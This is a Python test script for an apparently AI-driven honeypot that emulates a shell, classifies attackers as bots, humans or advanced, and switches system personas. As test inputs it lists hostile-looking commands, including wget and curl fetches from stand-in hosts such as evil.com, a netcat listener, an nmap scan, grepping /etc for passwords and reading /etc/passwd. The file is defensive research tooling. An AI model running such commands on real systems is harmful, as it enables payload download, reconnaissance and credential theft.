#!/usr/bin/env python3
"""
Test script for the Honeypot AI Engine
"""

from main import HoneypotAI, AttackerType, SystemPersona
import time

def test_attacker_classification():
    print("=== Testing Attacker Classification ===")
    honeypot = HoneypotAI()
    
    # Test bot behavior
    bot_commands = [
        "wget http://malicious.com/malware",
        "curl http://evil.com/script.sh", 
        "nmap -sS 192.168.1.1",
        "nc -l 4444",
        "telnet 192.168.1.100 23"
    ]
    
    print("Testing BOT commands:")
    for cmd in bot_commands:
        response = honeypot.process_command(cmd)
        print(f"  Command: {cmd}")
        print(f"  Classification: {honeypot.get_attacker_classification()}")
        print(f"  Response: {response[:50]}...")
        print()
    
    # Test human behavior
    human_commands = [
        "ls",
        "pwd", 
        "whoami",
        "cd /home",
        "cat .bashrc"
    ]
    
    honeypot2 = HoneypotAI()
    print("Testing HUMAN commands:")
    for cmd in human_commands:
        response = honeypot2.process_command(cmd)
        print(f"  Command: {cmd}")
        print(f"  Classification: {honeypot2.get_attacker_classification()}")
        print(f"  Response: {response[:50]}...")
        print()
    
    # Test advanced behavior
    advanced_commands = [
        "find /etc -name '*.conf' -exec cat {} \\;",
        "grep -r 'password' /etc/",
        "python -c 'import os; os.system(\"id\")'",
        "sudo -i",
        "systemctl status nginx"
    ]
    
    honeypot3 = HoneypotAI()
    print("Testing ADVANCED commands:")
    for cmd in advanced_commands:
        response = honeypot3.process_command(cmd)
        print(f"  Command: {cmd}")
        print(f"  Classification: {honeypot3.get_attacker_classification()}")
        print(f"  Response: {response[:50]}...")
        print()

def test_persona_switching():
    print("=== Testing Persona Switching ===")
    honeypot = HoneypotAI()
    
    # Force persona switches
    personas = [SystemPersona.LINUX_SERVER, SystemPersona.IOT_DEVICE, SystemPersona.ENTERPRISE_SERVER]
    
    for persona in personas:
        honeypot.response_engine.switch_persona(persona)
        print(f"Current Persona: {persona.value}")
        print(f"Prompt: {honeypot.get_prompt()}")
        
        # Test some basic commands
        test_commands = ["whoami", "cat /etc/passwd", "uname -a"]
        for cmd in test_commands:
            response = honeypot.process_command(cmd)
            print(f"  {cmd} -> {response[:50]}...")
        print()

def test_realistic_responses():
    print("=== Testing Realistic Shell Responses ===")
    honeypot = HoneypotAI()
    
    test_cases = [
        ("cat /etc/passwd", "Should return fake passwd file"),
        ("ls -la", "Should return detailed directory listing"),
        ("ps aux", "Should return fake process list"),
        ("wget http://example.com/file.txt", "Should simulate file download"),
        ("sudo su", "Should deny sudo access"),
        ("systemctl status nginx", "Should show service status"),
        ("ifconfig", "Should show network interface"),
        ("netstat -tlnp", "Should show listening ports")
    ]
    
    for command, description in test_cases:
        response = honeypot.process_command(command)
        print(f"Command: {command}")
        print(f"Description: {description}")
        print(f"Response: {response}")
        print("-" * 50)

def test_adaptive_behavior():
    print("=== Testing Adaptive Behavior ===")
    honeypot = HoneypotAI()
    
    # Simulate mixed behavior to trigger adaptation
    mixed_commands = [
        "ls",           # Human-like
        "wget http://x.com/malware",  # Bot-like
        "pwd",          # Human-like
        "find / -name '*.conf'",      # Advanced-like
        "curl http://y.com/script",   # Bot-like
        "whoami",       # Human-like
        "sudo -i",      # Advanced-like
        "cat /etc/passwd" # Human-like
    ]
    
    print("Initial state:")
    print(f"  Persona: {honeypot.response_engine.current_persona.value}")
    print(f"  Attacker: {honeypot.get_attacker_classification()}")
    
    for i, cmd in enumerate(mixed_commands):
        response = honeypot.process_command(cmd)
        print(f"\nCommand {i+1}: {cmd}")
        print(f"  Attacker: {honeypot.get_attacker_classification()}")
        print(f"  Persona: {honeypot.response_engine.current_persona.value}")
        
        # Check for persona adaptation every 10 commands
        if (i + 1) % 10 == 0:
            print("  *** Persona adaptation point ***")

def test_session_stats():
    print("=== Testing Session Statistics ===")
    honeypot = HoneypotAI()
    
    # Run some commands
    commands = ["ls", "pwd", "whoami", "cat /etc/passwd", "uname -a"]
    for cmd in commands:
        honeypot.process_command(cmd)
        time.sleep(0.1)  # Small delay to test timing
    
    stats = honeypot.get_session_stats()
    print("Session Statistics:")
    for key, value in stats.items():
        print(f"  {key}: {value}")

if __name__ == "__main__":
    print("Starting Honeypot AI Engine Tests")
    print("=" * 50)
    
    try:
        test_attacker_classification()
        print("\n" + "=" * 50)
        
        test_persona_switching()
        print("\n" + "=" * 50)
        
        test_realistic_responses()
        print("\n" + "=" * 50)
        
        test_adaptive_behavior()
        print("\n" + "=" * 50)
        
        test_session_stats()
        print("\n" + "=" * 50)
        
        print("All tests completed successfully!")
        
    except Exception as e:
        print(f"Test failed with error: {e}")
        import traceback
        traceback.print_exc()
